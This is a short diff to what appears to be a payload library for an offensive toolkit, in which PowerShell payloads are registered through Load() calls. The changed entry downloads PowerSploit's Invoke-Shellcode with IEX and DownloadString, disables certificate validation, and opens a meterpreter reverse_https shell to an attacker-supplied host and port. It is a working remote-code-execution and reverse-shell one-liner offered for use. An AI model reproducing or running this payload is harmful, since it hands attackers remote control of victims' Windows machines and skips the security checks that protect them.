@@ -182,8 +182,8 @@ Load({
 })
 
 Load({
-	title: "Remotely download and execute PowerSploit's Invoke-Shellcode",
-	payload: 'IEX (New-Object Net.WebClient).DownloadString("<PROMPT>");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <LHOST> -Lport <LPORT>',
+	title: "Remotely download and execute PowerSploit's Invoke-Shellcode over https (ignore cert mismatch)",
+	payload: '$w = New-Object Net.WebClient;[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX $w.DownloadString("<PROMPT>");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <LHOST> -Lport <LPORT> -Force',
 	category: "Powershell",
 	callback: function(bro){
 	    question("Enter the full path of your hosted copy of PowerSploit's Invoke-Shellcode script ")
